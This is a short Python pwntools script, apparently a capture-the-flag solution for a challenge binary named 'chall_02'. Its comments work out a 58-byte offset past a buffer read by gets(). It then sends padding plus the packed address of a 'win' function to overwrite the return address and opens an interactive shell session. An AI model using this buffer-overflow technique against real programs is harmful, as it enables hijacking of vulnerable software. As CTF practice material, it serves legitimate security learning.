'''
Address of win is known
vuln() -> gets()


get variable is stored in
var_3ah = ebp - 3A 
Then we canculate:
3Ah --> 58dec

'''

from pwn import *


p = process("./chall_02")
l1 = b"Something in here"
p.sendline(l1)

win = 0x080484d6

l2 = b"A" * 58 + b"oESP" + p32(win)
p.sendline(l2)
p.interactive()
